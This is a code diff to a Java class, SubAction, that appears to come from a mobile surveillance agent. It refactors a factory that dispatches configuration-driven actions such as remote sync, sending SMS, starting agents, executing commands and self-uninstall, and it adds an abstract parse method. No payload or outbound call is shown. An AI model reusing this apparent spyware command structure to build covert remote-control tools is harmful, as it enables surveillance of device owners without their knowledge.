@@ -36,7 +36,7 @@ public abstract class SubAction implements Runnable {
 	public final static int ACTION_SMS = 0x4004; // Invia un SMS
 
 	/** The Constant ACTION_TOOTHING. */
-	public final static int ACTION_TOOTHING = 0x4005; // Non utilizzata
+	//public final static int ACTION_TOOTHING = 0x4005; // Non utilizzata
 
 	/** The Constant ACTION_START_AGENT. */
 	public final static int ACTION_START_AGENT = 0x4006; // Avvia un agente
@@ -85,6 +85,8 @@ public abstract class SubAction implements Runnable {
 		this.subActionType = type;
 		this.subActionParams = params;
 		this.status = Status.self();
+		
+		parse(params);
 	}
 
 	/**
@@ -98,42 +100,50 @@ public abstract class SubAction implements Runnable {
 	 */
 	public static SubAction factory(final int type, final byte[] confParams) {
 		final Debug debug = new Debug();
+		
 		switch (type) {
-		case SubAction.ACTION_SYNC:
-			Log.d(TAG,"Factory *** ACTION_SYNC ***");
-			return new SyncActionInternet(type, confParams);
-		case ACTION_UNINSTALL:
-			Log.d(TAG,"Factory *** ACTION_UNINSTALL ***");
-			return new UninstallAction(type, confParams);
-		case ACTION_RELOAD:
-			Log.d(TAG,"Factory *** ACTION_RELOAD ***");
-			return new ReloadAction(type, confParams);
-		case ACTION_SMS:
-			Log.d(TAG,"Factory *** ACTION_SMS ***");
-			return new SmsAction(type, confParams);
-		case ACTION_TOOTHING:
-			Log.d(TAG,"Factory *** ACTION_TOOTHING ***");
-			return new ToothingAction(type, confParams);
-		case ACTION_START_AGENT:
-			Log.d(TAG,"Factory *** ACTION_START_AGENT ***");
-			return new StartAgentAction(type, confParams);
-		case ACTION_STOP_AGENT:
-			Log.d(TAG,"Factory *** ACTION_STOP_AGENT ***");
-			return new StopAgentAction(type, confParams);
-		case ACTION_SYNC_PDA:
-			Log.d(TAG,"Factory *** ACTION_SYNC_PDA ***");
-			return new SyncPdaAction(type, confParams);
-		case ACTION_EXECUTE:
-			Log.d(TAG,"Factory *** ACTION_EXECUTE ***");
-			return new ExecuteAction(type, confParams);
-		case ACTION_SYNC_APN:
-			Log.d(TAG,"Factory *** ACTION_SYNC ***");
-			return new SyncActionApn(type, confParams);
-		case ACTION_LOG:
-			Log.d(TAG,"Factory *** ACTION_INFO ***");
-			return new LogAction(type, confParams);
-		default:
-			return null;
+			case SubAction.ACTION_SYNC:
+				Log.d(TAG,"Factory *** ACTION_SYNC ***");
+				return new SyncActionInternet(type, confParams);
+				
+			case ACTION_UNINSTALL:
+				Log.d(TAG,"Factory *** ACTION_UNINSTALL ***");
+				return new UninstallAction(type, confParams);
+				
+			case ACTION_RELOAD:
+				Log.d(TAG,"Factory *** ACTION_RELOAD ***");
+				return new ReloadAction(type, confParams);
+				
+			case ACTION_SMS:
+				Log.d(TAG,"Factory *** ACTION_SMS ***");
+				return new SmsAction(type, confParams);
+				
+			case ACTION_START_AGENT:
+				Log.d(TAG,"Factory *** ACTION_START_AGENT ***");
+				return new StartAgentAction(type, confParams);
+				
+			case ACTION_STOP_AGENT:
+				Log.d(TAG,"Factory *** ACTION_STOP_AGENT ***");
+				return new StopAgentAction(type, confParams);
+				
+			case ACTION_SYNC_PDA:
+				Log.d(TAG,"Factory *** ACTION_SYNC_PDA ***");
+				return new SyncPdaAction(type, confParams);
+				
+			case ACTION_EXECUTE:
+				Log.d(TAG,"Factory *** ACTION_EXECUTE ***");
+				return new ExecuteAction(type, confParams);
+				
+			case ACTION_SYNC_APN:
+				Log.d(TAG,"Factory *** ACTION_SYNC ***");
+				return new SyncActionApn(type, confParams);
+				
+			case ACTION_LOG:
+				Log.d(TAG,"Factory *** ACTION_INFO ***");
+				return new LogAction(type, confParams);
+				
+			default:
+				return null;
 		}
 	}
 
@@ -158,6 +168,13 @@ public abstract class SubAction implements Runnable {
 	/** The finished. */
 	private boolean finished;
 
+	/**
+	 * Parse
+	 * 
+	 * @param params byte array from configuration
+	 */
+	protected abstract boolean parse(final byte[] params);
+	
 	/**
 	 * Execute.
 	 * 
